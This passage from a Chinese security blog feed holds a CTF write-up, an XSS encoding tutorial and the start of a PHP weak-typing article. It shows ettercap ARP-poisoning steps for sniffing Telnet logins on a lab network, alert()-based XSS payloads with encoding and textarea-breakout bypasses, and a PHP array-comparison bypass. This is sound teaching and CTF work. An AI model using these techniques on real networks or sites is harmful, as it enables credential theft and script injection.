alt=""></p><p>Telnet非常容易遭受到mitm攻击，所以这次我们尝试使用ettercap进行arp欺骗与mitm攻击，在kali上进行以下操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.ettercap -G</span><br><span class="line">2.Sniff----Unified-sniffing，然后选择网卡tap0</span><br><span class="line">3.Hosts---Scan for hosts---Hosts list，此时可以看到目标主机ip</span><br><span class="line">4.将172.30.0.2点add to target 1,将目标主机添加到目标1;选定路由，将172.30.0.2点add to target 2,将路由添加到目标2</span><br><span class="line">5.然后点mitm --- arp posoning ，勾选sniff remote connections：</span><br><span class="line">6.之后start --- start sniffing开始监听</span><br><span class="line">点view -- connections开始查看连接：</span><br><span class="line"></span><br><span class="line">可以获得172.30.0.2的Telnet信息</span><br><span class="line">7.telnet 172.30.0.2 23</span><br><span class="line">8.ls -a</span><br><span class="line">9.cat .ctf_flag</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/XT5m8wW.png" alt=""><br><img src="https://i.imgur.com/JEnG5N4.png" alt=""><br>成功读取到flag</p><h2 id="Alt-F4-for-Ops"><a href="#Alt-F4-for-Ops" class="headerlink" title="Alt-F4 for Ops"></a>Alt-F4 for Ops</h2><p>依旧是首先nmap一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn 172.30.0.0/28</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Nmap scan report for 172.30.0.2</span><br><span class="line">...</span><br><span class="line">23/tcp open  telnet</span><br><span class="line">MAC Address: 02:42:4E:8E:83:1A (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.30.0.3</span><br><span class="line">...</span><br><span class="line">All 1000 scanned ports on 172.30.0.3 are closed</span><br><span class="line">MAC Address: 02:42:A5:33:79:0D (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.30.0.14</span><br><span class="line">...</span><br><span class="line">All 1000 scanned ports on 172.30.0.14 are closed</span><br><span class="line"></span><br><span class="line">Nmap done: 16 IP addresses (3 hosts up) scanned in 146.64 seconds</span><br></pre></td></tr></table></figure><p>尝试使用ettercap进行arp欺骗与mitm攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.ettercap -G</span><br><span class="line">2.Sniff----Unified-sniffing，然后选择网卡tap0</span><br><span class="line">3.Hosts---Scan for hosts---Hosts list，此时可以看到目标主机ip</span><br><span class="line">4.将172.30.0.2点add to target 1,将目标主机添加到目标1;选定路由，将172.30.0.2点add to target 2,将路由添加到目标2</span><br><span class="line">5.然后点mitm --- arp posoning ，勾选sniff remote connections：</span><br><span class="line">6.之后start --- start sniffing开始监听</span><br><span class="line">点view -- connections开始查看连接：</span><br></pre></td></tr></table></figure><p>…<br>…<br>…<br>…</p><h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><blockquote><p><a href="https://blog.csdn.net/rectsuly/article/details/63261412" target="_blank" rel="noopener">https://blog.csdn.net/rectsuly/article/details/63261412</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      tamuctf Network部分wp。
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="内网穿透" scheme="https://museljh.github.io/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>探索xss中的编码原理</title>
    <link href="https://museljh.github.io/2019/03/06/%E6%8E%A2%E7%B4%A2xss%E4%B8%AD%E7%9A%84%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86/"/>
    <id>https://museljh.github.io/2019/03/06/探索xss中的编码原理/</id>
    <published>2019-03-06T12:06:31.000Z</published>
    <updated>2019-03-06T15:07:19.231Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><blockquote><p>JS解码</p></blockquote><p>先给出结论</p><blockquote><p>在javascript伪协议形式，全部字符串可以是任意的URL编码和实体字符。</p></blockquote><blockquote><p>在IE解析HTML时，只对所有实体编码做出解码，在解析URL时，会解码URL编码，script标签时，原始文本均不做处理！</p></blockquote><p>我们再给出下面三个test<br>Test1：URL 编码 “javascript:alert(1)”<br>URL编码“javascript:alert(1)”=“%6A%61%76%61%73%63%72%69%70%74:%61%6C%65%72%74%28%31%29”</p><p>Test2：HTML字符实体编码 “javascript” 、URL 编码 “alert(2)”<br>HTML编码”javascript”=”&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;”</p><p>URL编码”alert(2)”=” %61%6C%65%72%74%28%32%29”</p><p>Test3：对&lt;a href=&quot;javascript:alert(3)&quot;&gt;test3&lt;/a&gt;做JS编码àURL编码àHTML编码共3层。</p><p>JS编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(3)&quot;&gt;test3&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>URL编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;test3&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>HTML编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#49;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#53;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#50;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#52;&amp;#40;&amp;#51;&amp;#41;&quot;&gt;test3&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>【过程分析】<br>许多童鞋把Test1放到HTML里发现脚本并没有正常执行，就会想按照刚才分析的，URL解码之后Javascript解析器完成解码操作，脚本应该会正常执行啊，这里就有一个URL解析过程中的一个细节了，不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就导致Test1中被编码的“javascript”没有解码，当然不会被URL解析器识别了。</p><blockquote><p>这时候我们对于为什么question3、Question 1不能xss有了足够理解了把？</p></blockquote><p>那Test2也是对javascript编码了为什么可以执行呢？因为”javascript”是做的HTML实体编码，HTML解析器工作时，href里的HTML实体会被解码，接下来URL解析器工作解析href属性里的链接时，”javascript”协议在第一步被HTML解码了，这样URL解析器是可以识别的，然后继续解析后面的”%61%6C%65%72%74%28%32%29”，最后JavaScript解析器完成解析操作，脚本执行。</p><blockquote><p>这时候我们对于为什么question2能xss有了足够理解了把？</p></blockquote><p>Test3实现了3层复合编码，每一层编码都能正常执行，并思考一下在复合编码环境中XSS防御策略不做组合编码，后果是什么呢？</p><p>我们接下来再提出几个问题<br>Question 4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt; </span><br><span class="line">&lt;img src=x onerror=alert(4)&gt;</span><br></pre></td></tr></table></figure><p>Question 5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(5)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>Question 6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure><p>答案：都不可以执行xss，并且Question 5 实体编码不会被解码<br>探索：<br>为什么呢？<br>回到我们之前所说的，浏览器，以IE为例子，拿到HTML文本代码，然后扫描寻找左尖括号&lt;，找到即开始按照后面的字符串来生成相应的对象，然后把之后属性的值“赋值”给对象相应的属性，这里说明一下，这个属性其实在内存里并不是一个直接的值，而还是一个对象。<br>假设之前的例子中在a标签中的href里，有一个&gt;符号，<br>所以现浏览器只认&lt;,<br>Question 4中这里根本没有在文本里扫描到&lt;（因为被实体编码了），故根本就不是对象，不产生IMG元素</p><p>那么问题又来了，假如说Question 5中也同样用这种方式是可以解释的通，那么为什么Question 6却无法xss弹窗呢？</p><p>这里的textarea是一个非常特殊的例子</p><p>它有一个如下的特性<br>即使将html代码段插入textarea， html代码段不会执行， 仅仅将其作为普通文本显示。<br>在Question 5、6中只扫描到了textarea类型，产生了textarea，其余字符串只是作为值字符串，值里含有&lt;字符。</p><p><img src="https://i.imgur.com/of4NVgF.png" alt=""><br>当然textarea并非是绝对安全的，它仍然会遭到xss的攻击<br>在插入textarea内容时候，提前关闭标签，然后输出script脚本，如下</p><p>即构成如下脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;</span><br><span class="line"></span><br><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/textarea&gt;</span><br></pre></td></tr></table></figure><p>我们接下来继续再提出几个问题<br>Question 7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=&quot;confirm(&apos;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>Question 8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=&quot;confirm(&apos;8\u0027);&quot;&gt;Button&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>答案：Question 8不可以执行xss，Question 7可以执行xss<br>探索：<br>为什么呢？<br>因为onclick是事件触发情形，而事件触发的情况下只解码实体编码<br>所以对于Question 7来说进行HTML解码后就原始文本所以是可以被执行的，但是对于Question 8就不行了<br>是不是对这两个问题有了一定了解了呢？</p><p>我们接下来继续提出一系列问题<br>Question 9</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(9);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>Question 10</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>Question 11</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029\u003b&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>Question 12</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>Question 13</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;13\u0027)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>Question 14</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;14\u000a&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>Question 15</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>答案：只有9、10、14可以进行xss<br>探索：<br>我们在之前提到：对于script标签定义的JS,可以泛理解为IE会直接产生script对象，之后把innerHTML，也就是JS代码内容直接原封不动传给JS引擎去解释执行。</p><p>当然Question 9    在script标签里，原封不动交给js引擎。当然是可以触发xss的。<br>这里涉及到JS引擎对字符串的解码</p><p>先说question 14<br>javascript 出发了JS 解释器，JS会先对内容进行解析，里边有一个转义字符\u000a,前导的 \u 表示他是一个Unicode 字符，根据后边的数字，解析为’14 ’，于是在完成JS的解析之后变成了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;14</span><br><span class="line">&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后JS 解释器执行alert(‘14<br>‘)，这句话会交给浏览器渲染，最终弹窗。<br>这里边会有一个看起来让人有些疑惑的东西，以question 10为例子，假如我们编码的位置不是括号里，而是在alert上，我们知道，js 是会对它进行逆转义的：<br>所以question 10 仍然是可以的<br>而另一方面，如果想用这种方式来替换掉圆括号，或者引号，会判定为失败。同时，主要注意的方式，上边这种直接在字符串外进行专一的方式，只有Unicode 转义方式呗支持，其他转义方式则不行。其实，这样的策略是正确的，<br>因为对于JavaScript，转义编码应当只出现在标示符部分，不能用于对语法有真正影响的符号，也就是括号，或者是引号</p><p>所以question 11、12、13 是不可以进行xss的<br>至于Question 15 这里采用了html编码而这里却是需要先进行js解码，所以Question 15毫无疑问也是不可以的</p><p>当然这些问题同样也是适用于javascript伪协议的，如下，当然我就不再进行解释了，原理也是一样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(&apos;&lt;一&gt;&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href=&quot;javascript:alert(&apos;&lt;\u4e00&gt;&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href=&quot;javascript:\u0061lert(&apos;&lt;一&gt;&apos;)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>在一个页面中，可以出发JS 解析器的方式有这么几种</p><blockquote><p>直接嵌入&lt; script&gt; 代码块。<br>通过&lt; script sr=… &gt; 加载代码。<br>各种HTML CSS 参数支持JavaScript：URL 触发调用。<br>CSS expression(…) 语法和某些浏览器的XBL 绑定。<br>事件处理器(Event handlers),比如 onload, onerror, onclick等等。<br>定时器，Timer(setTimeout, setInterval)<br>eval(…) 调用</p></blockquote><p>最后我们再次构造两个场景</p><p>场景一：&lt;script&gt;alert(‘xss’)&lt;/script&gt;： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function init()</span><br><span class="line">&#123;</span><br><span class="line">document.getElementById(&quot;div1&quot;).innerHTML=&quot;&lt;script&gt;alert(&apos;aa&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body onload=init()&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>场景二：&lt;img src=’non-exist.jpg’ onerror=”alert(‘xss’)”&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function init()</span><br><span class="line">&#123;</span><br><span class="line">document.getElementById(&quot;div1&quot;).innerHTML=&quot;&lt;img src=&apos;aa.jpg&apos; onerror=\&quot;alert(&apos;aa&apos;)\&quot;/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body onload=init()&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>如果把这2个分别保存成HTML，但是发现第一个&lt;script&gt;alert(‘xss’)&lt;/script&gt;不会执行，但是第二个例子是会执行的。想想看为什么？<br>Tips：</p><p>innerHTML只能使用&lt;img src=1onerror=alert(1)&gt;这种方式来触发JS。而不能以&lt;script&gt;alert(1)&lt;/script&gt;来触发，因为这种压根不会执行&lt;script&gt;..&lt;/script&gt;之间的内容。<br>因为当我们的HTML解析器解析到&lt;script&gt;标签时，它会快速去查找离它最近的闭合标签&lt;/script&gt;。<br>而当我们提交&lt;script&gt;alert(1);&lt;/script&gt;,则可以正常弹框。</p><p>还是同样的解析原则，html解析引擎解析到&lt;script&gt;时，它会快速去查找离它最近的闭合标签&lt;/script&gt;。这是在到第8行时发现&lt;\/script&gt;标签，而不是&lt;/script&gt;,<br>故继续往下，直到找寻到&lt;/script&gt;标签，才完成了配对。其中的代码交给了js引起去解析。由于&lt;script&gt;alert(1);&lt;/script&gt;双引号包围，所以js解析器会把它当字符串处理。 所以最终的解析结果是第8行中的&lt;script&gt;和&lt;/script&gt;都是字符串而不是标签。</p><p>值得注意的是第当\字符的引入使得&lt;script&gt;标签在html解析引擎解析时未在最近被闭合,同时又因为\为js语法中的转义字符，故在js解析引擎解析时，又能正常解析input_str变量的值为&lt;script&gt;alert(1);&lt;/script&gt;字符串，所以最总成功弹窗，很巧妙！</p><p>小结：<br>我们知道XSS漏洞最常见的检测方式就是输入&lt;script&gt;alert(‘xss’)&lt;/script&gt;来确认，大部分人在测试的时候就是直接使用类似&lt;script&gt;alert(‘xss’)&lt;/script&gt;这样的输入，如果发现有弹出对话框就说明存在漏洞，如果没有对话框就认为不存在漏洞。那么，只使用&lt;script&gt;标签是否就足够了呢？</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>对于xss编码的研究就先到这里了，当然xss的绕过方法不仅仅只有编码这一种，但仅仅只是编码问题，想要研究透彻还是需要一些时间的，这里我仅仅是探索一些我能够查到的资料，还有未查到的知识等着我们探索</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://blog.csdn.net/qq_35513598/article/details/79861908" target="_blank" rel="noopener">https://blog.csdn.net/qq_35513598/article/details/79861908</a><br><a href="https://blog.csdn.net/czh500/article/details/79903698" target="_blank" rel="noopener">https://blog.csdn.net/czh500/article/details/79903698</a><br><a href="http://test.attacker-domain.com/browserparsing/tests.html" target="_blank" rel="noopener">http://test.attacker-domain.com/browserparsing/tests.html</a><br><a href="https://xz.aliyun.com/t/1556" target="_blank" rel="noopener">https://xz.aliyun.com/t/1556</a><br><a href="https://shinpachi8.github.io/2017/07/28/xss%E7%BC%96%E7%A0%81/" target="_blank" rel="noopener">https://shinpachi8.github.io/2017/07/28/xss%E7%BC%96%E7%A0%81/</a><br><a href="https://security.yirendai.com/news/share/26" target="_blank" rel="noopener">https://security.yirendai.com/news/share/26</a><br><a href="https://www.cnblogs.com/lightsong/p/4356698.html" target="_blank" rel="noopener">https://www.cnblogs.com/lightsong/p/4356698.html</a><br><a href="http://www.voidcn.com/article/p-tapgsgbo-baz.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-tapgsgbo-baz.html</a><br><a href="http://gv7.me/articles/2018/escape-string-in-xss/" target="_blank" rel="noopener">http://gv7.me/articles/2018/escape-string-in-xss/</a><br><a href="http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/" target="_blank" rel="noopener">http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      探索xss在浏览器中是如何被渲染的。
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="xss" scheme="https://museljh.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>记一次深入理解PHP弱类型原理的经历并以此第一次深入了解PHP内核</title>
    <link href="https://museljh.github.io/2019/03/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%8E%9F%E7%90%86%E7%9A%84%E7%BB%8F%E5%8E%86%E5%B9%B6%E4%BB%A5%E6%AD%A4%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3PHP%E5%86%85%E6%A0%B8/"/>
    <id>https://museljh.github.io/2019/03/04/记一次深入理解PHP弱类型原理的经历并以此第一次深入了解PHP内核/</id>
    <published>2019-03-04T14:44:50.000Z</published>
    <updated>2019-03-04T15:03:56.759Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在CTF比赛中PHP弱类型的特性常常被用上，但我们往往知其然不知其所以然，究竟为什么PHP是弱类型呢？很少人深究。在这次源码分析的过程中我收获很大，第一次学会了如何深入理解一个问题，虽然花费了我很多时间，但这可以说是一段非常值得的经历。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先引入一个问题，为什么以下结果是恒为真的呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump([]&gt;1);</span><br><span class="line">var_dump([]&gt;0);</span><br><span class="line">var_dump([]&gt;-1);</span><br></pre></td></tr></table></figure><p>当然实际ctf中问题可能会如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[Password]&gt;99999;</span><br></pre></td></tr></table></figure><p>当传入Password[]=1<br>时侯恒为真<br>当然再换一种形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump([[]]&gt;[1]);</span><br></pre></td></tr></table></figure><p>依旧是恒为真<br>对于这类问题，很多人都是认为PHP因为它是弱类型语言它就有这种特性<br>那么为什么PHP会有这种特性呢？<br>我们首先查阅下PHP手册<br><a href="http://php.net/manual/en/language.operators.comparison.php#language.operators.comparison.types" target="_blank" rel="noopener">Comparison Operators</a><br><img src="https://i.imgur.com/RuQpofN.png" alt=""><br>在手册中写到，当array和anything进行比较的时候array is always greater<br>这是一种PHP的定义。<br>那么究竟PHP到底在哪定义了这种特点呢？<br>我们依旧不知道。<br>我们再抛出个问题究竟什么是PHP弱类型呢？<br>很多人可能会回答弱类型就是弱类型，当传入Password[]=1就会绕过这就是弱类型<br>这种回答肯定是不妥当的<br>具体弱类型定义</p><blockquote><p>PHP是弱类型语言，不需要明确的定义变量的类型，变量的类型根据使用时的上下文所决定，也就是变量会根据不同表达式所需要的类型自动转换，比如求和，PHP会将两个相加的值转为long、double再进行加和。每种类型转为另外一种类型都有固定的规则，当某个操作发现类型不符时就会按照这个规则进行转换，这个规则正是弱类型实现的基础。</p></blockquote><p>我们再通过查阅PHP源码来深刻理解PHP弱类型的特点<br>PHP是开源的一种语言，我们在Github上可以很容易的查询到它的源码<br><a href="https://github.com/php/php-src/blob/master/Zend/zend_operators.h" target="_blank" rel="noopener">传送门</a><br>这里找函数会方便点<br>当然解释下什么是Zend</p><blockquote><p>Zend是PHP语言实现的最为重要的部分，是PHP最基础、最核心的部分，它的源码在/Zend目录下，PHP代码从编译到执行都是由Zend完成的</p></blockquote><p>至于为什么要查询zend_operators.h这个文件，operator操作符，其他几个文件不像存在比较函数，有的时候查源码时候就是需要靠感觉，这种大项目 函数变量什么的都有规范 一般所见即所得 看懂英语就大概猜得到用途的，<br>当然这个文件也不一般<br>我再进行解释下,当然想深入理解可以看<a href="http://wiki.jikexueyuan.com/project/extending-embedding-php/2.1.html" target="_blank" rel="noopener">这里</a></p><blockquote><p>PHP在内核中是通过zval这个结构体来存储变量的，它的定义在Zend/zend.h文件里，简短精炼，只有四个成员组成：</p></blockquote><p>我们定位到函数</p><blockquote><p>ZEND_API int ZEND_FASTCALL is_smaller_function(zval *result, zval *op1, zval *op2);</p></blockquote><p>这里传入了两个值op1,op2,传出一个result<br>解释下zval类型</p><blockquote><p>zval以一个P结尾的宏的参数大多是<em>zval型变量。 此外获取变量类型的宏还有两个，分别是Z_TYPE和Z_TYPE_PP，前者的参数是zval型，而后者的参数则是*</em>zval。</p></blockquote><p>这样说可能会有些抽象<br>我们换种方式解释，当再php源码中要想判断一个变量的类型最直接的方式，比如想判断这个变量是否为空<br>变量-&gt;type == IS_NULL</p><p>这种方法虽然是正确的，但PHP官网并不建议这么做，PHP中定义了大量的宏，供我们检测、操作变量使用<br>解释下什么是宏</p><blockquote><p>C语言中允许用一个标识符来标识一个字符串，称为“宏”；标识符为“宏名”。在编译预处理时，对程序中所有出现的“宏名”，都用宏定义时的字符串去代换，简称“宏代换”或“宏展开”。一般形式：#define 宏名 字符串</p></blockquote><p>宏定义说明及注意：</p><blockquote><p>宏定义时用宏名来表示一个字符串，在宏展开时又以该字符串替换了宏名，这只是一个简单的替换；<br>宏定义不需要再行末加分号，若加上分号，则会连分号也会被替换的；<br>宏定义必须在函数外面；宏定义的作用域：从定义命令至程序结束，若想终止宏的作用域，则使用undef命令；<br>宏名在程序中用引号括起来，则预处理程序对其不进行宏替换；<br>宏定义是可以嵌套使用的，在展开时，由预处理程序层层替换；<br>建议在进行宏定义时，尽量使用大写字母表示宏名；<br>可用宏来表示数据类型，使书写方便；<br>对“输出格式”做用定义，可以减少书写麻烦。</p></blockquote><p>PHP建议使用的形式<br>Z_TYPE_P(变量) == IS_NULL</p><blockquote><p>以一个P结尾的宏的参数大多是<em>zval型变量。 此外获取变量类型的宏还有两个，分别是Z_TYPE和Z_TYPE_PP，前者的参数是zval型，而后者的参数则是*</em>zval</p></blockquote><p>这样我们便可以猜测一下php内核是如何实现gettype这个函数了，代码如下：想要详细了解的可以看<a href="http://wiki.jikexueyuan.com/project/extending-embedding-php/2.1.html" target="_blank" 